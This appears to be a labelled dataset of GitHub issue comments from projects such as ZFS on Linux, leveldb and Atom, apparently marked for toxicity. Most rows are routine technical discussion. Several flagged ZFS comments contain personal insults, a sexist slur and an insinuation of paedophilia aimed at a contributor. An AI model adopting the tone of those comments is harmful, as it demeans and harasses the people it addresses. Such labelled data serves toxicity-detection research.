xregexp/slevithan/146/242410744,Please provide a code snippet that reproduces the issue. ,False,True,False,xregexp/slevithan/146
xregexp/slevithan/146/242432364,"This is just for parsing some class dependencies in a file with YUIdoc comments like this expected result should be when running exec that an array containing both entries is returned, but ♠ XRegExp.exec(data, fileRegex);` only returns the same data as match - forEach on the other hand returns indeed each. ",False,True,False,xregexp/slevithan/146
xregexp/slevithan/146/243021029,"That is not how  (or the native ) works with flag . With ,  doesn't change what kind of result is returned; rather it makes the match attempt use  as its starting position.  uses the provided  argument to set the start position regardless of whether the provided regex uses flag . See  for details. For your use case, use  or . ",False,True,False,xregexp/slevithan/146
xregexp/slevithan/146/243067377,"thanks, I misunderstood the exec() description's ""match array"" (correct term though, just misguided expectations for its meaning) ",False,True,False,xregexp/slevithan/146
zfs/zfsonlinux/7861/356609376,"Hello, as referenced by others, I have a pool that was mistakenly upgraded under Linux that needs to go back to FreeBSD.  Unfortunately userobj_accounting is enabled, which means that FreeBSD won't take the pool due to an unsupported feature. I saw mention of this commit enabling feature disable functionality.  I grabbed a Ubuntu 14.04 boot disk and tried to install it, but got a build error, wondering if anyone might point me toward a fix so I can disable that feature and export this pool? SPL built and installed okay, but on the ZFS build I get from that commit, I get the following... ",False,True,False,zfs/zfsonlinux/7861
zfs/zfsonlinux/7861/418239329,"Why are you ignoring both rules and requests ( Please use the issue template if you found a bug, otherwise ask the mailing lists ( you for your cooperation. ",False,True,False,zfs/zfsonlinux/7861
zfs/zfsonlinux/7861/418241114,"The question I asked was in regard to the lead developer of this project making a patch for himself to use on a catch22 in feature flags, and therefore not addressed to you.  Nor is it addressed to anyone else that is using a current version of this software, since the relevant patch is over three years old (and now deprecated). What makes you think I'm agreeing with anything you typed?  Don't thank me, I'm not. Thank you, for nothing.  I'd file a bug report about people with pedophile'ish usernames with such high exposure in a project that Canonical seems to care so much about, but your form is (predictably) excessive.  No thanks. For those who might find this on Google, don't bother with that patch/commit.  If your pool got userobj_accounting enabled it is now a Linux-only pool.  You'll have to destroy it, since per the (broken) explanation in the manpage, once active it cannot be decactivated.  Sort of like that Doomsday Machine that Slim Pickens was after.... ",True,True,False,zfs/zfsonlinux/7861
zfs/zfsonlinux/7861/418254587,"Still, you post on a bug report platform watched by &gt; 400 people that get emailed for each of your posts. Nobody asked for your opionion. There are rules established by the community, people who largely work on this project for free, an you can either stick to their rules, not contribute (anything) at all, or fork the project and work on your fork under your own rules. wink  I'll unsubscribe from this issue and won't comment here further. ",False,True,False,zfs/zfsonlinux/7861
zfs/zfsonlinux/7960/364146679,"Hello. I am using Gentoo and ZFS-master. All was fine, until I decided to upgrade ZFS. In gentoo for upgrade I need to merge 2 packages zfs and zfs-kmod.  Zfs was merged OK, but stopped working. local ~ # zfs list bad property list invalid property 'name' I thought it will work when latest kernel module will be merged. But it fails to compile. CC [M]  /var/tmp/portage/sys-fs/zfs-kmod-9999/work/zfs-kmod-9999/module/zfs/zfs_sysfs.o   CC [M]  /var/tmp/portage/sys-fs/zfs-kmod-9999/work/zfs-kmod-9999/module/zfs/zfs_vfsops.o /var/tmp/portage/sys-fs/zfs-kmod-9999/work/zfs-kmod-9999/module/zfs/zfs_sysfs.c In function ‘zfs_kobj_add_attr’ /var/tmp/portage/sys-fs/zfs-kmod-9999/work/zfs-kmod-9999/module/zfs/zfs_sysfs.c15138 error assignment of member ‘name’ in read-only object   zkobj-&gt;zko_attr_list[attr_num].name = attr_name;                                       ^ /var/tmp/portage/sys-fs/zfs-kmod-9999/work/zfs-kmod-9999/module/zfs/zfs_sysfs.c15238 error assignment of member ‘mode’ in read-only object   zkobj-&gt;zko_attr_list[attr_num].mode = 0444; Please help me fixing these issues. Gentoo-Hardened, zfs-9999, zfs-kmod-9999, Linux-grsecurity-4.9.74, GCC 7.3.0 ",False,True,False,zfs/zfsonlinux/7960
zfs/zfsonlinux/7960/424840274,I can test under gentoo in a little while. ,False,True,False,zfs/zfsonlinux/7960
zfs/zfsonlinux/7960/425100392,"Could be a mismatch between kernel and userland ABI In case you upgraded from a way older version (=didn't  for quite some time) you still might have the old userland binaries somewhere in your path, their location changed a while ago. Similar problem (when you can only locate the new version in your path) could happen when the old kernel module is still loaded but the new version of the userland is used. The compilation error could be caused in concert with grsecurity, see  for a similar case (and possibly a solution). ",False,True,False,zfs/zfsonlinux/7960
zfs/zfsonlinux/7960/425155629,"BTW, I also tried gcc 7.3 on gentoo-sources-4.18.10 (different machine) and the compile worked fine as well. ",False,True,False,zfs/zfsonlinux/7960
zfs/zfsonlinux/7960/425857028,"Thanks for replies. About zfs binary stopped working I know, it is because I compiled a new version of zfs and still use old version of zfs-kmod. I am using this kernel for a long time and compilation of zfs worked well always. My last successful compilation was about 4-6 commits ago to the master. I read this link about grsecurity, but didn't found a solution. Also, I don't see any grsecurity errors at dmesg while compiling. So now I have new zfs and old zfs-kmod and I am afraid to reboot, I don't know how to compile the same version in gentoo or back-forward for some commits. I think the problem is related to some new code in last commits, the kernel version or gcc version.  I am using zfs (master) 1.5+ years at 4.9.24-grsec and about a year on 4.9.74-grsec (minipli), and compilation always was successful.  Please help me resolve these issues.  Glibc-2.26-r7, gcc-7.3.0-r5 hardened profile, binutils-2.31.1 ",False,True,False,zfs/zfsonlinux/7960
zfs/zfsonlinux/7960/426425810,@friend just fork the repo and create a custom branch if newer commits don't work for you you can modify zfs-kmod-9999.ebuild e.g. like so that way I'm e.g. selecting my repo and via EGIT_BRANCH the specific branch to be used. This needs to be done both for sys-fs/zfs and sys-fs/zfs-kmod ! Hope that helps. ,False,True,False,zfs/zfsonlinux/7960
zfs/zfsonlinux/7960/429906489,"Hello. I tried to compile it on linux-4.9.131-dappersec, the latest grsec-updated kernel, and it also failed. I have compiled it successfully on latest linux-4.18.14-gentoo.  As I know, 4.9.x is a longterm, so it is kernel-version-related or grsecurity-related. But as I told you, 4-5 commits back it compiled and worked fine. Is it possible to fix master to work with 4.9.x grsecurity kernels? It was working for years before. Thanks. ",False,True,False,zfs/zfsonlinux/7960
zfs/zfsonlinux/7960/436129493,"Hello. Anything on this? Because of some commit (I think it is related to  I can't use dappersec kernel anymore. I also tried with 4.9.132-dappersec, and the error is the same. It was always compatible with grsecurity patches, please fix it. Thanks so much ",False,True,False,zfs/zfsonlinux/7960
zfs/zfsonlinux/7960/438406957,"Hello. Some update. I decided to go back to the commit it was working. I was looking at history of zfs_sysfs.c file  and found that it started to fail since commits from Sep 2. So it is not related to  compiled it successfully with a commit before that  EGIT_COMMIT=""bb91178e60df553071ce2e18b0067ef703f7b583"" I hope this information will help fix building on dappersec kernels. Thanks! ",False,True,False,zfs/zfsonlinux/7960
zfs/zfsonlinux/7960/445478342,"Hi, I just saw this. I will let someone know so a PR can be opened, meanwhile I had some other fixes written for a few other spots that need testing. ",False,True,False,zfs/zfsonlinux/7960
zfs/zfsonlinux/7960/457885294,"@friend I was about to send some patches in, including this one, but apparently someone with oper rights in the channel was feeling like a primadonna and decided to issue a ban over hurt feelings related to a comment about the semantics of the word 'mostly'.... after PMS'ing around other folks. Did not seem like someone technically involved in the project, but he went ahead and did the same in -social. Therefore, odds are you did not get a message in the channel mentioning another issue that is present with the spl debug code (without further analysis it looks like misuse of snprintf(), leading to a single byte leak, but I haven't verified this proper). Holding on to the patches for now. ",False,True,False,zfs/zfsonlinux/7960
zfs/zfsonlinux/7960/457890088,"@friend  if you have patches, submit them. but name calling and hostility won't be tolerated even if you have patches to submit to the project. in your comment here, you decided to continue with hostility and name calling. it's a pattern you have exhibited for time, and a few users decided enough was enough. no one else complained about the loss. please behave professionally, and I will do the same. ",False,True,False,zfs/zfsonlinux/7960
zfs/zfsonlinux/7960/457913319,"This is long overdue, this project needs a code of conduct. ",False,True,False,zfs/zfsonlinux/7960
zfs/zfsonlinux/7960/457998235,"I am temporarily locking this thread.  If I could please ask everyone to calm down, I'm not about to pick sides in whatever conflict that is currently taking place here.  Brian has asked for someone to submit a PR to fix this issue.  Until that takes place, there is no reason for this issue to remain wide open given its current state. ",False,True,False,zfs/zfsonlinux/7960
zfs/zfsonlinux/7960/457992782,"Eh, after reviewing that other issue where someone is calling for a Code of Conduct (which is a fairly dumb idea), I'm surprised to see that you assumed that person was me (perhaps the intention of the troll all along). Since this begs finally some proper attention, I will describe this issue (feel free to remove the comment later as you obviously are seemingly easily to have your feelings hurt regardless of whether the other person intended so or not...). I'll just clarify a few things I've never asked for help in the channel and treated someone ""poorly"". I responded ironically to ptx0's messages, after he spent the past few hours being dismissive or condescending to other people, obviously in some cases users with a very limited skill around ZFS, but that does not merit acting like an imbecile. None of them were insults or hostile, they simply pointed out that ptx0 was assuming things constantly and then replying with an air of arrogance and usually in a condescending tone, despite himself being far from a beacon of excellence as far as technical skill or coding go. Immediately after he proceeded to ban me from the channel, to which I responded in -social pointing out that his attitude and actions making him look puerile and petty regardless of the nature of the ""offense"" by someone else. This knee-jerk reaction came motivated more by petty personal sentiments (and sharing those with some others who, well, fit that profile) than any actually reasonable reasons. Now, on the project you are routinely accepting patches quite obviously without really doing your due diligence, ensuring proper QA, etc. Case in point, the one we have here. It's painful to see that you waste more time on petty nothings over actually making your code or merged patches look like something with a modicum of technical quality. The control over whether contributors are just copy-pasting from other spots (hint licensing violations get people sued), if the patches actually conflict with major kernel features, or symbol exports, or..... is lacking all over the place. How about instead of making up half-truths about people offending your feelings, or your buddies' feelings, you go and properly benefit from the resources you so adamantly defend (and ask others to work with) How difficult was it to grab the patch I sent you from the link, test it, test it again, sign it off and merge it? You need to go around deleting comments and engaging in conversation with the other troll, but you are too busy to actually merge an out of band patch while you waste time over petty fights? Well, good luck with that. And you are surprised ZoL is not taken seriously anywhere but by the homelab/non-enterprise crowd. If you want to be a primadonna, at least have the cards in your sleeve to back it up you can't justify it right now with the standard you are providing your users. And it runs in ring0, so go figure a better way to fend off all those users popping up on IRC asking about destroyed data because you merged a patch from a pull-request that would not stand a moment in the LKML. ",True,True,False,zfs/zfsonlinux/7960
zfs/zfsonlinux/8259/397574283,System information  Type | Version/Name  --- | ---  Distribution Name   | Fedora Distribution Version    | 30 (rawhide) Linux Kernel    | 5.0.0-0.rc1.git0.1.fc30.x86_64 Architecture    | x86-64 ZFS Version | master SPL Version | master   Describe the problem you're observing The latest kernel refactors the FPU code  need to rename our #includes  and  on newer kernels. Describe how to reproduce the problem /home/hutter/current_kernel_time64/include/linux/simd_x86.h9810 fatal error asm/i387.h No such file or directory include &lt;asm/i387.h&gt;       ^~~~~~~~~~~~  compilation terminated. ♠ ,False,True,False,zfs/zfsonlinux/8259
zfs/zfsonlinux/7960/458315146,"The discussion in this thread (now hidden) has not been productive.  In the future, please speak respectfully to fellow contributors.  @friend and I are working on putting a process in place for handling inappropriate behavior.  In the mean time, please feel free to contact either Brian or I privately if you have concerns about the behavior of ZFSonLinux community members. ",False,True,False,zfs/zfsonlinux/7960
zfs/zfsonlinux/8259/452902510,"The underlying issue comes from kernel commit 12209993e98c5fa1855c467f22a24e3d5b8be205 (""x86/fpu Don't export kernelfpu{begin,end}()""), which unexports kernel_fpu_begin(), and causes the configure tests not to define HAVE_FPU_API_H.  Changing the header locations will just lead to another failure later because kernel_fpu_begin/end() are exported GPL, and can't be used directly from the zfs module. See the thread on LKML starting here ",False,True,False,zfs/zfsonlinux/8259
zfs/zfsonlinux/8259/452918667,@friend thanks for bringing this to our attention.  Hopefully they change their minds and  so we can use that instead. ,False,True,False,zfs/zfsonlinux/8259
zfs/zfsonlinux/8259/453279143, love the replies. Greg K-H ,False,True,False,zfs/zfsonlinux/8259
zfs/zfsonlinux/7960/458004816,"I had no idea who it was. that seems unnecessary. perhaps you were being unintentionally abrasive, as you were in the previous sentence where you imply I have easily hurt feelings. I'm sure you didn't mean to do that, right? then you can see how easily words can be misunderstood. however, more than once have you come and ask for input (maybe not ""help"", exactly) and then were rude to the people who were asking you for more information. criticising how they were attempting to help you. we are volunteers who want to help others. we don't want to deal with difficult people. bans aren't permanent, they can be removed.. sometimes bad things happen in life and we need to respond to them appropriately. people are known to have bad days. coming onto the issue tracker and claiming to withhold your help because of an unrelated incident is not an appropriate response to being banned from an IRC channel. I'd been curious who I'd abused so horribly that day and went back and found this I couldn't find any instances of being condescending or dismissive of any new users, though I did help save someone from redoing hours of work and then warned them about a potential issue. this is a part of a pattern of language from you that we have grown tired of. why do you think it's okay to call others imbeciles? who are you talking about? who is ""they""? I couldn't find this conversation. where did it happen? alright, it may have been a knee-jerk reaction. if you'd messaged me to work it out, things probably would have been Just Fine. interpersonal differences can be worked out, everyone in the project wants the same thing. the ZFS test suite is  very new  and has many deficiencies. testing every possible scenario is, as you must be aware, the impossible task. if you've found problems with the process, raise them specifically as new issues so that they can be addressed. I haven't seen anything until just now, but you don't raise any specific issues or offer any solutions, which seems less than helpful. but a lot of it has simply been spent waiting for a PR to be opened. if you're seeing it happen, why didn't you step up and submit one? is it because of the fact you've pointed out in the past that you consider our contribution process on github to be ""for hipsters"" and something you are essentially too good for? if you have any improvements you see you can make, please do so. otherwise you're just insulting the members of the project, again. any license violations should be raised with the project and fixed. can you cite any specific cases? I don't know what you're talking about. it should be easy to find cases where this is true if it's ""all over the place"". is it too much to ask you to not be rude to people when they give you advice? to not come on here and then insult everyone else's work - people who weren't even involved in your quarrel? for what it's worth, I'm not the one who's responsible for merging patches - there is but one gateway for this project to have patches merged. I can review, test, ask for changes, but that's where it ends. Brian is the one who merges the changes. I have to propose a corollary  to your question. how difficult is it to open a pull request? you mentioned back in early December you were going to open one. I deleted your comment here that only served to insult me and hold your PR hostage. if you don't want to submit the PR, don't - other users can do it when we find the time. it's a cooperative effort. you don't care to be a part of the project in the way we've required, and so your patch doesn't find inclusion. is this surprising to anyone? observation I don't know how long it took you to write your own comment here but it seems like you could have opened a PR in less time. this is another example of your pattern of disrespect. ""You are surprised""? who? not taken seriously? that'd actually be news to... well.. most of us, I imagine. I'm not sure I quite follow. you've seen users reporting data loss with a released build? would that be v0.7.10 that we marked as On Fire shortly after release and that was never included in any distribution? maybe an  related data loss back in 2013 from AIO write path errors? but that was never in a finished release. it might actually be helpful to have a list of data issues that ZFS has had in the past, similar to CVEs. ",True,True,False,zfs/zfsonlinux/7960
zfs/zfsonlinux/8259/453348790,It would be nice if Oracle would just fix the license once and for all. ,False,True,False,zfs/zfsonlinux/8259
zfs/zfsonlinux/8259/453353256,please don't post meaningless comments. ,False,True,False,zfs/zfsonlinux/8259
zfs/zfsonlinux/8259/454169579,"I think we need to operate under the assumption that they're not going to export the functions, and just disable the vectorized versions of the checksums if  are not detected. ",False,True,False,zfs/zfsonlinux/8259
zfs/zfsonlinux/8259/496714988,Looks like the kernel people may have backported their patch to older kernels ,False,True,False,zfs/zfsonlinux/8259
Laravel-Excel/Maatwebsite/1167/222091604,"Please prefix your issue with one of the following [BUG] [PROPOSAL] [QUESTION]. Resource interpreted as Document but transferred with MIME type application/vnd.ms-excel "" version, Laravel version Expected behaviour Actual behaviour Exception stack trace Screenshot of Excel file Steps to reproduce the behaviour ",False,True,False,Laravel-Excel/Maatwebsite/1167
Laravel-Excel/Maatwebsite/1167/351925554,"hello ,  @friend  did you find a solution yet ? we're having the same problem.. ",False,True,False,Laravel-Excel/Maatwebsite/1167
Laravel-Excel/Maatwebsite/1167/376088747,Great Job. Closed. Gone like the wind ,False,True,False,Laravel-Excel/Maatwebsite/1167
tensorlayer/tensorlayer/688/330658223,Just an issue to link toward the discussion we have on  repository ,False,True,False,tensorlayer/tensorlayer/688
orm/doctrine/7568/453773242,"Closing, erasing, locking and blocking the author. This is the first and last interaction on these communication level. ",False,True,False,orm/doctrine/7568
minitest/seattlerb/779/371324137,"In #757 the following exchange happened  want to motivate the position @friend has. My exact test scenario is this  I am tested a random member of an array that comes back from an API. I am comparing the equality of the member's data with the represented object's method response (something like . These should always be equal, but sometimes both are . One thing I might do is modify my  cassette so that there are no  values, but I would rather have the data represent reality. I would advocate for maintaining 's current behavior rather than having this kind of test fail in Minitest 6. ",False,True,False,minitest/seattlerb/779
minitest/seattlerb/779/430842876,In order to avoid the deprivation warnings I simply converted  my random data with nullables tests to . 🤷🏼‍♂️ ,False,True,False,minitest/seattlerb/779
minitest/seattlerb/779/430856214,"Ah, great idea. I'm fine with doing that and therefore closing this request. ",False,True,False,minitest/seattlerb/779
minitest/seattlerb/757/314736795,It'd be spiffy cool if this warning stated the test location (file pathline number) causing it. ,False,True,False,minitest/seattlerb/757
minitest/seattlerb/757/381788802,OK - it's leaving something not entirely useful to me ♠DEPRECATED Use assert_nil if expecting nil from /usr/local/bundle/gems/rspec-rails-3.7.2/lib/rspec/rails/adapters.rb212. This will fail in Minitest 6.` Maybe I need to update rspec-rails... minitest (5.11.3) rspec-rails (3.7.2)  ,False,True,False,minitest/seattlerb/757
minitest/seattlerb/757/381843544,It looks like you already use the latest version of rspec-rails. ,False,True,False,minitest/seattlerb/757
minitest/seattlerb/757/426386695,I dislike this deprecation all together. Sometimes I need to assert that two things are the same (like source and mapped data) when they both may or may not be nil. ,False,True,False,minitest/seattlerb/757
minitest/seattlerb/757/426817804,@friend Absolutely nothing about this is stopping you. You just need to be more explicit now. Please don't piggy back on (fairly) unrelated issues. Open a new one if you must. ,False,True,False,minitest/seattlerb/757
leveldb/google/519/266261333,"Now, before you tell me this is a lot of work I know, and am working on it (and almost done). Ideally, I would like to have my changes merged here, so I have a few questions and concerns for my current port. Questions Should I target a specific C++ standard? Currently, my code depends on a few C+plus one1 features, which can be easily removed with a few macros. This makes the code less readable, however, if C++03 support is desired, I will gladly change my implementation to conform to an older standard. How to handle Unicode filesystem support? Currently, LevelDB uses -based (narrow) strings for for all filesystem operations, which does not translate well for Windows systems (since narrow strings use the ANSI, or OEM legacy codepages, and not UTF-8, for backwards compatibility). This means paths using international characters, or emojis, are therefore not supported with a simple port, something I consider to be an undesirable solution for a modern library. All the current forks of levelDB do not solve this fundamental issue, leading me to create my own implementation. Possible solutions include  A narrow (UTF-8) API on *Nix, and a wide (UTF-16) API on Windows, using a typedef to determine the proper path type. Converting all narrow strings from UTF-8 to UTF-16 before calling WinAPI functions. Providing both a narrow (ANSI) and wide (UTF-16) API on Windows.  The 2nd option, although the least amount of work, is the least amenable for me since the API would then seemingly lies to users of levelDB, since strings would have to be UTF-8 encoded rather than using the local code page, in contrast with the entirety of the WinAPI. The 3rd option, however, duplicates code to support both the narrow and wide WinAPI, which would increase the amount of work required to maintain levelDB. The first option is a happy median it minimizes redundancy and is consistent with expectations about *Nix and Windows paths. I am, however, amenable to any suggestions the levelDB authors may have. Intellectual Property To emulate the behavior of  on Windows, I used a very lightweight library (&lt;250 lines of code) from Steven Lee, mman-win32. However, looking over your contributor license agreement, it seems that my port would not satisfy Google's CLA until I remove this code from my implementation. If this is the case, I could easily use the raw WinAPI functions rather than the emulated  in my Windows port. Please notify me if I should remove this code prior to submitting a pull request. Other Changes CMake Build System I introduced a CMake build system, which retains most of the same logic as the existing Makefile. The existing Makefile has not been deprecated. AppVeyor Continual Integration To ensure builds do not break the Windows builds, I am planning to add an AppVeyor configuration, which allows continual integration on Windows using MSVC. Summary If there is still interest for native Windows support, and the proposed changes are amenable to the levelDB authors, I would gladly submit a pull request. ",False,True,False,leveldb/google/519
leveldb/google/519/337360742,"On Tue, Oct 17, 2017 at 109 PM, Alexander Huszagh &lt;notifications@friend.com We haven't made a decision w.r.t. this yet, so it will be easiest if it does not rely on on c++03 only.  Would it be a big problem to do so? Here is what I suggest make a separate Env implementation for Windows (instead of attempting to reuse env_posix.cc).  That Env implementation (like all other Env implementations), accepts char-based (narrow) strings, which are always utf8 encoded.  Inside this Env's implementation, it can convert back and forth between the utf8 strings that the rest of leveldb assumes, and whatever type is appropriate for windows APIs called in the implementation. If there is significant code in env_posix.cc you find yourself needing, consider refactoring that out into a separate .h/.cc (which are private to the leveldb implementation) so you can share the code in your Env implementation. Yes, this should be removed.  In general, we have been throttling back mmap usage anyway (it helps a bit with microbenchmarks, but causes a bunch of portability problems).  So I suggest a good initial start will be to just use raw WinAPI functions. AppVeyor Continual Integration This sounds very helpful. This sounds very useful to me.  I would like it if the changes were limited to the following (a) A windows Env implementation as I mentioned above. (b) Build/portability changes. Is that feasible, or you are seeing the need to make widespread changes? — ",False,True,False,leveldb/google/519
leveldb/google/519/337366812,"Work on CMake support is already underway. Please use  as a starting point, to avoid rework. Also, please use the Travis CI and AppVeyor configurations in  as a starting point for yours. In general, I recommend following the approach taken by Chromium's LevelDB integration. Chromium builds (and runs) on Windows, and does not require modifications to the rest of the LevelDB. ",False,True,False,leveldb/google/519
leveldb/google/519/337370860,"Thank you for the feedback. This would be very feasible to do @friend, especially if we use UTF-8 paths and just convert them in the Windows environment. As for CMake support, I will use that as a starting point (thank you). I will remove the  compatibility and use the raw WinAPI calls. Due to my other work, I should be able to finish this later this week. ",False,True,False,leveldb/google/519
leveldb/google/519/338343400,"@friend and @friend, a quick question When I asked the C+plus one1 features and limiting myself to C++03, did you mean limit the codebase to C++98 or C+plus one1? I have a few situations where  is dramatically more convenient than other code, however, I can remove this (it's only for  and ). Other than that, the port should not require any new features. Thank you and I am effectively done with my port, other than this minor question. ",False,True,False,leveldb/google/519
leveldb/google/519/338343611,"We've recently decided that the next release will require C+plus one1, so it's OK to use C+plus one1. Sorry for the code churn on your end... this decision was not taken lightly. ",False,True,False,leveldb/google/519
leveldb/google/519/338349556,"@friend No worries, I understand that such fundamental choices do not lend themselves to casual decisions. Thank you for all the help. ",False,True,False,leveldb/google/519
leveldb/google/519/339730150,"Hi @friend, As a soon-to-be user of the leveldb Windows support (for Mesos), here are are my thoughts For us, C+plus one1 is fine, we already target this. This is an annoying problem, I had to fix this for Mesos. I went with It also leads into long path issues on Windows. I took an approach similar to the one CMake took for their Windows port, a  helper to translate all paths as they reach WinAPI functions from UTF-8 to UTF-16 with  prepended if necessary. My helper is here (note that the max path is not 255 despite documentation). I need to stress native long path support is probably a must for most Windows projects nowadays. It's not terribly difficult to do, it's just really annoying. Also, for your comment I'm not sure I entirely agree, there is no data loss going from UTF-8 to UTF-16. Both encodings are Unicode, it's just an implementation difference. Plus, you can do the conversion natively in C+plus one1. Anyway, I've not had any problems on Windows having gone this route so far. Thanks for your work! I personally know the trouble it is 😉 ",False,True,False,leveldb/google/519
leveldb/google/519/339737680,"Also Yay, a million times, yay! We'll pull it into Mesos with . ",False,True,False,leveldb/google/519
leveldb/google/519/340604344,"Hi @friend and @friend, I've had a few issues I cannot currently debug. I will attempt to use the Boost-based ""windows"" branch as a reference-point in short order. Specifically, I've had 3 major issues  fails intermittently. ~10% of the time, it succeeds, without issue. 25% of the time, it produces a slightly lower number of keys than the 1.1m requires (almost always greater than 1.09m). The rest of the time, it produces the error .  fails intermittently (at about the same frequency) during the  section (from  to  Most severely though, however, is the multi-threaded section seems to produce the  error consistently, which would defeat the entire purpose of a multi-thread access.   Otherwise, all the test cases and benchmarks work. Just a heads up for the major delay. ",False,True,False,leveldb/google/519
leveldb/google/519/340607629,"No worries about delays. Honestly, I'm backed up with other work for the next two of weeks, and the odds that I'll be able to look at this are very low. ",False,True,False,leveldb/google/519
leveldb/google/519/342437294,"Everything has been patched, and I am adding extended file length support currently. @friend, for the extended file length support, since the  prefix effectively removes all path parsing, do you know if there's anything else I need to consider other than  Relative paths (which cannot use the extended file length prefix). , , or  in paths (somewhat tricky, see below).  For the  and  operators, manually parsing them is somewhat tricky, since directory symbolic links may be in play. The only time-tested strategy for this is to iterate over all roots, parent directories, check to see if the item is a directory symbolic link or junction, get the real path of the directory if it is a symlink or junction, and then continue from there. This is because  does not actually point to  if  is a symlink or junction. This is very doable (and is relatively easy to implement), but it is fairly expensive since it requires filesystem calls. It requires a temporary vector to store each path component. Step-wise, the general approach is as follows  Check if the path is absolute (skip remaining steps otherwise). Replace all forward separators with backslashes. Iterate over each parent component, from the root (drive letter, such as , or UNC root, such as ), excluding the file (we don't care if the file is a symlink, since relative path components cannot follow it). If the directory basename is , ignore the directory. If the directory basename is , remove the preceding directory component. Otherwise, check if the directory is a symlink by calling  with the  and  flags. If the handle is successfully created, it's a symlink, otherwise, it is not. If the directory is a symlink, read the proper path using  with the  code, and reset the vector using the absolute new path.  I would be totally amenable to implementing this (as you can see, I've done this before), but this may add a lot of expense for a feature that application developer should have to be aware of themselves. @friend, any thoughts? Should extended file length support be added, including with the caveats mentioned above? ",False,True,False,leveldb/google/519
leveldb/google/519/342996212,"@friend I don't believe you missed anything. Re bullet 6 I'm using this logic in Mesos adding the  flag only if its a directory. I also specifically use , though you probably got that. Re point 7 I resolve the path using  with the  flag, after using to get a handle to the file/directory at the resolved path. Re I agree that just letting the end-user provide  without any extra handling from  might be just fine, so long as all the Windows APIs used are the Unicode versions (and specifically listed as supporting long paths; though this is most of them). ",False,True,False,leveldb/google/519
leveldb/google/519/343001715,"@friend All the Window APIs are the Unicode versions. Currently, I use  for files and directories, but that is easily changed. As for , unfortunately it somewhat raises a chicken/egg problem. ",False,True,False,leveldb/google/519
leveldb/google/519/343002312,"If  is working for both, don't let me tell you it's wrong! I was using  specifically for resolution of symlinks; I see where it wouldn't quite work for you here. Perfecto. ",False,True,False,leveldb/google/519
leveldb/google/519/385616180,"Hi, I wanted to ask how your work is going? It's been about six months since your last messages, but I do not see any result. I need to build a library under Windows and I do not know how. ",False,True,False,leveldb/google/519
leveldb/google/519/386349540,"@friend Sorry, I got extremely busy with work and have submitted a few PRs to this extent but it still needs work. My Windows development PC just arrived after breaking in March, so I should be able to finish this soon. If you would to use this branch, it currently works on Windows ",False,True,False,leveldb/google/519
leveldb/google/519/387911250,I think the ball is currently in our court. I need to find time to reconcile the various Windows PRs we've received with what we think this should look like. ,False,True,False,leveldb/google/519
leveldb/google/519/408673841,"Hi -- no pressure, but is there any ETA for when Windows support will land? Thanks! ",False,True,False,leveldb/google/519
leveldb/google/519/408971568,"We have no timeline for this, sorry. ",False,True,False,leveldb/google/519
leveldb/google/519/467145791,"Hi, it's me again. I really need a Windows port to start experimenting with LevelDB. Is  the best port so far? I just need to hack something together before the official port lands. ",False,True,False,leveldb/google/519
leveldb/google/519/467256035,"At this point, I'm fairly convinced that this topic won't benefit from external input until we land the Windows port. Locking so googlers can focus their limited time on landing the code. I expect that locked conversations are frustrating to external contributors, and I'm sorry for that. I'm doing this because the subtler request above hasn't been effective. ",False,True,False,leveldb/google/519
app-service-announcements/Azure/12/238342293,"Background ARRAffinity is a cookie used to affinitize a client to an instance of an Azure Web App. e.g. if an app is scaled out to 10 instances, and a user accesses it from their browser, the ARRAffinity helps keep the user going back to the same app instance, instead of getting a random instance each time. This can be useful for some apps that keep user state in memory. What is changing This cookie is meant to be round-tripped back to the server via the browser, but it is not meant to be consumed client side (it is not a meaningful value to the client). To enforce that the client code cannot access it from Javascript code, it will now have the HttpOnly flag set, which prevents accessing it from the  collection. See this blog post for a good explanation of why it is good security practice to do this. Note that in the case of ARRAffinity, there was never a real security hole, since this cookie is not a valuable secret even if stolen. Still, for the sake of defense in depth and preventing something that should not be done, it makes sense to make it HttpOnly (which it should have been from the start). Who can be affected by this change The only way you can be affected by this change is if you have client side code that tries to access this cookie. We don't think there are any useful scenarios where this should be done, but be aware that you will no longer see this cookie in the client side cookie list. ",False,True,False,app-service-announcements/Azure/12
app-service-announcements/Azure/12/357868536,"Hi David, Just come across this as i was running a pen test tool from pen-testtools.com and it flagged that Secure flag was missing on my Azure Web App. Does this change above affect all Web Apps , existing and new ? cheers Andy   Cookie Name Flags missing     ARRAffinity Secure    ",False,True,False,app-service-announcements/Azure/12
app-service-announcements/Azure/12/358062660,@friend let's move discussion to ,False,True,False,app-service-announcements/Azure/12
AssettoCorsaTools/zegreatclan/188/352294095, Add computed fuel strategy like F1 2017 = a value that shows if you can finish the race and helps you knowing if you have to fuel save or not   ,False,True,False,AssettoCorsaTools/zegreatclan/188
find-and-replace/atom/322/51376975,"Somewhere between .151 and .153 the ""Find prev"" button (when opening Find&amp;Replace with Ctrl+F)  disappeared. Is this a bug?  If this was a decision that was made, can you reconsider it? I can't recall any ""Find"" utility in any editor/web browser/whatever not having a ""Find prev"" button near the ""Find next"" button. It's really not comfortable having to go to the top menu, then clicking ""Find"" and then clicking ""Find prev"" in the menu. ",False,True,False,find-and-replace/atom/322
find-and-replace/atom/322/66220653,It was intentional. Very very few people click that button. You can use the keyboard shortcut  instead. ,False,True,False,find-and-replace/atom/322
find-and-replace/atom/322/66222380,"@friend are you basing that statement on some kind of statistics? If so, are those statistics public? ",False,True,False,find-and-replace/atom/322
find-and-replace/atom/322/70861003,For those of us not using a Mac what's the keyboard shortcut for Find Previous? I tried Ctrl+Shif+g but that only opens the Styleguide. ,False,True,False,find-and-replace/atom/322
find-and-replace/atom/322/70868813,"Nope, that's find in project. ",False,True,False,find-and-replace/atom/322
find-and-replace/atom/322/70872534,"@friend that's probably a bug in styleguide. Can you open an issue on styleguide? Can you open the keybinding resolver (), use the key command and screenshot it for the new issue? ",False,True,False,find-and-replace/atom/322
find-and-replace/atom/322/70872731,You could also do  while the cursor is in the find box (sorry about the wrong shortcut listed above). ,False,True,False,find-and-replace/atom/322
find-and-replace/atom/322/70877317,"@friend How can a keyboard shortcut conflict between two packages be a bug in one of them? If I open a bug over there I'm pretty sure they will say it's working as intended and it's this package that needs to change the shortcut. Even so I'll open the issue over there to see what they say. All of this could easily be solved by having a proper ""Previous"" button ;) @friend Nope, that does nothing. ",False,True,False,find-and-replace/atom/322
find-and-replace/atom/322/70878050,I maintain both of them. It was an oversight on my part. ,False,True,False,find-and-replace/atom/322
find-and-replace/atom/322/70901686,"Huh, I swear shift+enter works for me.  Odd. ",False,True,False,find-and-replace/atom/322
